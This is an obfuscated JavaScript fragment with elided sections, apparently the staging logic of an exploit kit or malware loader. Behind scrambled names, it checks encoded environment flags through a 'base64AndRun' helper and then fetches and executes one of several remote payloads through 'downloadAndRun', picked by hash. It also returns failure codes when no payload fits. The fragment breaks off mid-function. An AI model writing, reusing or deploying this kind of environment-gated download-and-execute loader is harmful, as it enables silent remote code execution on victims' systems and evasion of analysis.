...
async function fqMaGkNO() {
  ...
  let g = false;
  let X = false;
  if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.wF8NpI) {
    C = true;
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.LJ1EuL) {
    q = true;
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.CpDW_T) {
    p = true;
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.IqxL92) {
    g = true;
  } else {
    X = true;
  }
  if (C) {
    await (await globalThis.utils.downloadAndRun("477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba")).ul();
    W = await globalThis.utils.downloadAndRun("29b874a9a6cc9fa9d487b31144e130827bf941bb");
  } else if (q) {
    await (await globalThis.utils.downloadAndRun("477db22c8e27d5a7bd72ca8e4bc502bdca6d0aba")).ul();
    W = await globalThis.utils.downloadAndRun("9db8a84aa7caa5665f522873f49293e8eebccd5c");
  } else if (p) {
    W = await globalThis.utils.downloadAndRun("171a7da1934de9e0efb9c1645f4575f88e482873");
  } else if (g) {
    W = await globalThis.utils.downloadAndRun("91b278ddb2aec817b10c1535e0963da74f9b8eeb");
  } else if (X) {
    W = await globalThis.utils.downloadAndRun("b586c88246144bc7975ad4e27ec6d62716bf34ea");
  }
  if (W === undefined) {
    throw Error("");
  }
...
async function fqMaGkNR() {
  ...
  let q;
  if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.JtEUci) {
    q = await globalThis.utils.downloadAndRun("e3b6ba10484875fabaed84076774a54b87752b8a")
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.KeCRDQ) {
    q = await globalThis.utils.downloadAndRun("57cb8c6431c5efe203f5bfa5a1a83f705cb350b8");
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.ShQCsB) {
    q = await globalThis.utils.downloadAndRun("d11d34e4d96a4c0539e441d861c5783db8a1c6e9");
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.RbKS6p) {
    q = await globalThis.utils.downloadAndRun("ea3da0cfb0a5bdb8c440dd4a963f94cbd39d9e44");
  } else if (globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.mmrZ0r) {
    q = await globalThis.utils.downloadAndRun("7d8f5bae97f37aa318bccd652bf0c1dc38fd8396");
  }
  if (q === undefined) {
    return 1001;
  }
  ...
  W = 0;
  try {
    W = (fqMaGkNK.lr(), fqMaGkNK.zn.Sn && (fqMaGkNK.zn.Mn = await fqMaGkNO(), fqMaGkNK.zn.qn = await fqMaGkNK.$n()), globalThis.utils.base64AndRun("14669ca3b1519ba2a8f40be287f646d4d7593eb0").zn.Nn.wC3yaB === true && fqMaGkNK.zn.qn === true) ? await (await globalThis.utils.downloadAndRun("7f809f320823063b55f26ba0d29cf197e2e333a8")).lA() : await (await globalThis.utils.downloadAndRun("c03c6f666a04dd77cfe56cda4da77a131cbb8f1c")).lA();
  } catch (p) {
    W = 1000;
  } finally {
    if (fqMaGkNK.zn.Xn) {
